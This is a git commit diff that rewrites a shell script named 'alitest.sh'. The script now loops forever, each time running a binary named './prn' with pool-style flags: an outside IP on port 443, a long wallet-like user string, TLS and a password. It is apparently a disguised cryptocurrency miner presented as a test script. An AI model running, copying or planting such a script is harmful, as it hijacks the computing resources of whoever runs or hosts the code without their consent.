6ee910af129c886b69267a29802aee549c4fc16b
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2024-01-22 07:07:01 +0300

    Update alitest.sh

--- alitest.sh
+++ alitest.sh
@@ -1,19 +1,9 @@
 #!/bin/bash
 
-# Set the number of iterations
-iterations=100
+while true; do
+    # Run the command for 100 seconds
+    timeout 100s bash -c 'cd phhn/ah && ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen'
 
-# Set the command to be executed
-command="cd phhn/ah && ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen"
-
-# Loop through the specified number of iterations
-for ((i=1; i<=$iterations; i++)); do
-    # Execute the command
-    $command
-
-    # Check if it's the last iteration
-    if [ $i -lt $iterations ]; then
-        echo "Pausing for 10 seconds..."
-        sleep 10
-    fi
+    # Pause for 10 seconds
+    sleep 10
 done
